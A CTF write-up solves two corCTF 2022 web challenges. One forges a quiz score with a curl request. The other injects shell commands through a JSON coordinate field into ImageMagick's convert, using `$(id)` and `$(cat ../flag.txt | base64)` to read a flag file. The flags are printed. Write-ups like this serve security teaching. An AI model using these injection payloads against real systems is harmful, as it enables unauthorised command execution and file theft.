# Cor CTF 2022 - Web 
------------------------

## Json Quiz
#### about :
- Type: web 
- Level: easy
- Points : 104

<center><img src="../images/jsonquiz.png"></center>

Going to https://jsonquiz.be.ax/ , inspecting the javascript source code i found this form : 
```javascript
    // TODO: implement scoring somehow
    // kinda lazy, ill figure this out some other time

    setTimeout(() => {
        let score = 0;
        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "score=" + score
        })
        .then(r => r.json())
        .then(j => {
            if (j.pass) {
                $("#reward").innerText = j.flag;
                $("#pass").style.display = "block";
            }
            else {
                $("#fail").style.display = "block";
            }
        });
    }, 1250);
```
What it does is check send the final score to backend to check if the score enough to  get a reward (flag) , the questions numbered 20 ,sending the perfect mark gives the 

flag : 
    curl https://jsonquiz.be.ax/submit -d "score=20"

result : 
    {"pass":true,"flag":"corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}"}


## Msfrog Generator: 
#### about :
- Type: web 
- Level: easy
- Points : 109

<center><img src="../images/msfrog_generator.png"></center>

if we visit the website it look like this : 

<center><img src="../images/msfrog.png"></center>

the generate button send a POST request to /api/generate with the body: 

> [{"type":"mseyes.png;","pos":{"x":0,"y":0}}]

trying to change the type i got this error : 
> I wont pass a non existing image to a shell command lol

trying to mess with x position `x=ls` : 

> Something went wrong :
> b"convert-im6.q16: invalid argument for option `-geometry': +ls+0 @ error/convert.c/ConvertImageCommand/1672.\n"

it seems to be the beckend takes the type and x , y as key  arguments to be supplimented to a binary called convert-im6, let try some command injection with `x:"$(id)"` : 

> b"convert-im6.q16: invalid argument for option `-geometry': +uid=33(www-data) @ error/convert.c/ConvertImageCommand/1672.\n"

it works !! , i found the flag in `../flag.txt` with the payload `x:"$(cat ../flag.txt | base64)"` : 

flag : corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}